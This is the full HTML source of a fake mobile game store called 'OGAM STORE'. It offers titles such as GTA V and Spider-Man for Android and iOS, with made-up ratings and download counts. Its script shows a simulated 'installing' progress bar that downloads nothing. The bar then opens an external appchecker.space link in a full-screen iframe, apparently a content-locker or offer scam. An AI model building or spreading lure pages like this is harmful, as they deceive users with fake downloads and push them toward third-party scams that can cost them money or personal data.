<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OGAM STORE</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
body{
margin:0;
font-family:Orbitron;
background: radial-gradient(circle at top,#0f172a,#020617);
color:white;
overflow-x:hidden;
}

/* glow */
body::before{
content:"";
position:fixed;
width:500px;
height:500px;
background:radial-gradient(circle,#00ffcc55,transparent 60%);
top:-100px;
left:-100px;
filter:blur(60px);
animation:move 6s infinite alternate;
}
@keyframes move{
from{transform:translate(0,0);}
to{transform:translate(120px,80px);}
}

/* NAV */
nav{
display:flex;
justify-content:space-between;
align-items:center;
padding:15px 30px;
backdrop-filter:blur(15px);
background:rgba(15,23,42,0.6);
position:sticky;
top:0;
z-index:1000;
border-bottom:1px solid #1e293b;
}
.logo{
display:flex;
align-items:center;
gap:10px;
font-weight:900;
text-shadow:0 0 20px #00ffcc;
}
.logo span{color:#00ffcc;}

/* HERO */
.hero{text-align:center;padding:40px 20px;}
.hero h1{
font-size:60px;
margin:0;
background:linear-gradient(90deg,#00ffcc,#3b82f6,#a855f7);
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
}
.hero p{opacity:0.7;}

/* GRID */
.games{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
gap:20px;
padding:30px;
}

/* CARD */
.card{
background:rgba(17,24,39,0.8);
border:1px solid #1e293b;
border-radius:16px;
overflow:hidden;
transition:0.3s;
}
.card:hover{
transform:translateY(-10px);
box-shadow:0 20px 40px rgba(0,255,204,0.2);
}
.card img{width:100%;height:150px;object-fit:cover;}
.card-body{padding:12px;}
.title{color:#00ffcc;font-weight:800;}
.meta{display:flex;justify-content:space-between;font-size:12px;margin-top:8px;}
.rating,.downloads{
background:#0f172a;
padding:5px 8px;
border-radius:8px;
border:1px solid #1e293b;
}

/* BUTTON */
.btn{
margin-top:10px;
padding:10px;
text-align:center;
border-radius:10px;
cursor:pointer;
font-weight:800;
background:linear-gradient(90deg,#00ffcc,#3b82f6);
color:black;
}

/* MODAL */
.modal{
position:fixed;
inset:0;
background:rgba(0,0,0,0.85);
display:none;
align-items:center;
justify-content:center;
z-index:9999;
}

/* BOX */
.box{
width:350px;
background:#0f172a;
border:1px solid #1e293b;
border-radius:15px;
padding:15px;
text-align:center;
box-shadow:0 0 40px #00ffcc22;
}

/* iframe modal bigger */
.frameBox{
width:90%;
height:90%;
border-radius:15px;
overflow:hidden;
border:1px solid #00ffcc33;
box-shadow:0 0 60px #00ffcc22;
}
iframe{
width:100%;
height:100%;
border:none;
background:white;
}

/* progress */
.bar{width:100%;height:8px;background:#1e293b;border-radius:10px;overflow:hidden;}
.bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,#00ffcc,#3b82f6);}
#percent{font-size:35px;color:#00ffcc;}
</style>
</head>

<body>

<nav>
<div class="logo">
<i class="fa-solid fa-gamepad"></i>
<span>OGAM STORE</span>
</div>
</nav>

<div class="hero">
<h1>🎮 OGAM STORE</h1>
<p>Ultra Gaming Experience • 3D Neon Edition 🔥</p>
</div>

<div class="games" id="games"></div>

<!-- PLATFORM -->
<div class="modal" id="platformModal">
  <div class="box">
    <h3>Choose Platform 🎯</h3>
    <button class="btn" onclick="choose('Android')">Android 🤖</button>
    <br><br>
    <button class="btn" onclick="choose('iOS')">iOS 🍎</button>
  </div>
</div>

<!-- INSTALL -->
<div class="modal" id="installModal">
  <div class="box">
    <img id="img" style="width:100%;border-radius:10px;">
    <h3 id="title"></h3>
    <p id="status"></p>
    <div class="bar"><span id="bar"></span></div>
    <h1 id="percent">0%</h1>
  </div>
</div>

<!-- LINK INSIDE PAGE -->
<div class="modal" id="linkModal">
  <div class="frameBox">
    <iframe id="frame"></iframe>
  </div>
</div>

<script>

const link="https://appchecker.space/cl/i/rnnqgv";
let current=null;

const games=[
["Spider-Man","4.9","12.4M","https://cdn.cloudflare.steamstatic.com/steam/apps/1817070/header.jpg"],
["GTA V","4.8","25M","https://cdn.cloudflare.steamstatic.com/steam/apps/271590/header.jpg"],
["Forza Horizon 5","4.7","8.9M","https://cdn.cloudflare.steamstatic.com/steam/apps/1551360/header.jpg"]
];

const g=document.getElementById("games");

games.forEach((x,i)=>{
g.innerHTML+=`
<div class="card">
<img src="${x[3]}">
<div class="card-body">
<div class="title">${x[0]}</div>

<div class="meta">
<div class="rating"><i class="fa fa-star"></i>${x[1]}</div>
<div class="downloads"><i class="fa fa-download"></i>${x[2]}</div>
</div>

<div class="btn" onclick="openP(${i})">Install ⚡</div>
</div>
</div>
`;
});

function openP(i){
current=games[i];
document.getElementById("platformModal").style.display="flex";
}

function choose(type){
document.getElementById("platformModal").style.display="none";
document.getElementById("installModal").style.display="flex";

document.getElementById("img").src=current[3];
document.getElementById("title").innerText=current[0];
document.getElementById("status").innerText="Installing for "+type;

let p=0;

let interval=setInterval(()=>{
p+=2;
document.getElementById("percent").innerText=p+"%";
document.getElementById("bar").style.width=p+"%";

if(p>=100){
clearInterval(interval);

document.getElementById("installModal").style.display="none";
document.getElementById("linkModal").style.display="flex";
document.getElementById("frame").src = link;
}

},30);
}
</script>

</body>
</html>
